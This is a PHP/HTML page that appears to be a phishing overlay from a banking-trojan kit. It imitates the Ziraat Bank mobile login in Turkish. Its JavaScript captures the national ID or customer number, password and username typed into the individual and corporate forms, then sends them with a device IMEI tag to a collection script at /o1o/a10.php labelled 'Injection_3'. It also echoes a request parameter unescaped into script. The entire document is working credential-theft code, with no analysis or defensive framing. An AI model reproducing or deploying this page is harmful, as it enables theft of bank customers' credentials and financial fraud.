<html>
<head>
<meta charset="UTF-8">
<link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="data:text/css;charset=utf-8," data-href="http://getbootstrap.com/dist/css/bootstrap-theme.min.css" rel="stylesheet" id="bs-theme-stylesheet">
<link href="tr/com.ziraat.ziraatmobil/style.css" rel="stylesheet">


</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<center> <img width="150px" src="tr/com.ziraat.ziraatmobil/logo.png"></center>
<p style="color: white; font-size: 20px;">Mobil Bankacılık Uygulamamıza <br> Hoş Geldiniz</p>

<div id="content_div1">
 <form method="post">

<A href="#" class="hr1">Bireysel</A><A href="#" class="hr2" onclick="document.getElementById('content_div1').style.display = 'none'; document.getElementById('content_div2').style.display = 'block';">Kurumsal</A><div style="clear:both"></div>
<br>
<div class="bg">
 <div class="glyphicon glyphicon-user nn1" style="color:white;"></div>
		<div class="field">
			<input type="text" name="fields[login]" class="input" id="id" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" placeholder="TC Kimlik yada Müşteri Numaranız">
			<label for="id">TC Kimlik yada Müşteri Numaranız</label>
		</div>
		<br>
  <div class="glyphicon glyphicon-lock nn2" style="color:white;"></div><div class="field">
			<input type="password" name="fields[password]" class="input" id="pass"  placeholder="Şifre">
			<label for="pass">Şifre</label>
        </div>

</div>

  <button id="input_submitBtn" onclick="SentServer1();" class="s1" type="submit">Devam</button>
  <p style="text-align: center; color: #fff;padding-right: 20px;"> <u>Şifremi Unuttum</u> </p>
  <div style="clear:both"></div>

  <div style="clear:both"></div>

 </div>
</form>
  <script type="text/javascript">

  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('pass');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='';
var imei_c='<?php echo $_GET['p']; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|ziraat_bireysel|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>

 <div id="content_div2">
 <form method="post">
<A href="#" class="hr11" onclick="document.getElementById('content_div2').style.display = 'none'; document.getElementById('content_div1').style.display = 'block';">Bireysel</A><A href="#" class="hr22">Kurumsal</A><div style="clear:both"></div>

<div class="bg2">
 <div class="glyphicon glyphicon-user nn11" style="color:white;"></div>
 		<div class="field">
			<input type="text" name="fields[login]2" class="input" id="id2" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" placeholder="Müşteri Numaranız">
			<label for="id2">Müşteri Numaranız</label>
		</div>
		<br>
  <div class="glyphicon glyphicon-th nn33" style="color:white;"></div>
  		<div class="field">
			<input type="text" name="fields[password2]" class="input" id="ii"  placeholder="Giriş Şifreniz">
			<label for="ii">Giriş Şifreniz</label>
		</div>
			<br>
  <div class="glyphicon glyphicon-lock nn22" style="color:white;"></div>		<div class="field">
			<input type="password" name="fields[password3]" class="input" maxlength="8" id="pass2" placeholder="Kullanıcı Adınız">
			<label for="pass2">Kullanıcı Adınız</label>
		</div>

  <button id="input_submitBtn3" onclick="SentServer2();" class="s2" type="submit">Devam</button>
  <div style="clear:both"></div>

  <div style="clear:both"></div>
 </div>


</form>
  <script type="text/javascript">
  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn3');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id2');
                        var oCodeInp = document.getElementById('ii');
                        var oPass2Inp = document.getElementById('pass2');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oPass2Inp.value)) {
							try{
                                oPass2Inp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='';
var imei_c='<?php echo $_GET['p']; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|ziraat_kurumsal|"+oNumInp.value+"|"+oCodeInp.value+"|"+oPass2Inp.value);

return false;
};

})();
            </script>
</div>
</body>
</html>
